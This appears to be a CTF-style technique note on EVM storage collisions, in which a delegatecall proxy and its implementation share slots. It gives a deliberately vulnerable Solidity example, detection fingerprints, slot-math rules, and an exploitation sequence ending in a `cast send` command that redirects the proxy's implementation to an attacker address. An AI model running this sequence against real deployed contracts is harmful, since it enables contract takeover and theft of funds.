# Storage collision — a write that lands on the wrong slot

## The shape

The EVM stores state by **slot number**, not name. Two contract families share
storage:

1. **proxy + implementation via delegatecall** — the impl's writes land on the
   proxy's slots at impl's declared positions.
2. **a public setter on a packed slot** — a var packed with a neighbor, where
   writing one clobbers the other.

```solidity
contract Proxy {
    address public impl;      // slot 0
    address public owner;     // slot 1
    fallback() external { impl.delegatecall(msg.data); }
}
contract Impl {
    address public a;         // slot 0 ← collides with proxy's impl!
    function setA(address x) external { a = x; }   // writes proxy slot 0 → impl = x!
}
```

`setA` is meant for impl's slot 0; run through `delegatecall` it overwrites the
PROXY's slot 0 — the `impl` pointer itself → redirect all future delegatecalls
to attacker code.

## The detection fingerprint

- a proxy/impl pair via `delegatecall` whose declared var ORDER differs
- a `delegatecall` whose target sits in a slot a callable function writes
- packed vars where a setter's width spills into a neighbor
- **falsifier**: proxy and impl declare identical slot layout (the "unstructured
  storage" / EIP-1967 pattern avoids it by putting the impl at a hashed slot)

## The exploitation order

1. `cast storage $PROXY 0/1/2...` — map the proxy's layout
2. read the impl's declared vars — its slot N maps to proxy's slot N
3. find an impl function that writes a slot that is `owner`/`impl`/a predicate
   var in the PROXY
4. call it through the proxy's `fallback` → the write lands on the protected slot

```bash
cast send $PROXY "setA(address)" $ATTACKER_ADDR --private-key $KEY --rpc-url $RPC
# proxy slot 0 (impl) now = attacker; next delegatecall runs attacker code
```

## The slot-math reference

```
scalar var k declared Nth → slot N
mapping(k=>v) at slot p   → value at keccak256(k . p)
dynamic array at slot p   → length at p, elem[i] at keccak256(p) + i
string/bytes at slot p    → short: data+len in p; long: len at p, data at keccak256(p)
packed vars               → consecutive small vars share one slot, right-to-left
```

`cast storage $ADDR $SLOT` reads raw; `cast index`/`cast keccak` computes the
mapping/array slot. A `private` var is read the same way — "private" only hides
it from other contracts, not from `eth_getStorageAt`.

## The evidence

`cast storage $PROXY <owner-slot>` = attacker after the tx; `isSolved() → true`.
The slot read before/after is the proof the write landed where intended.
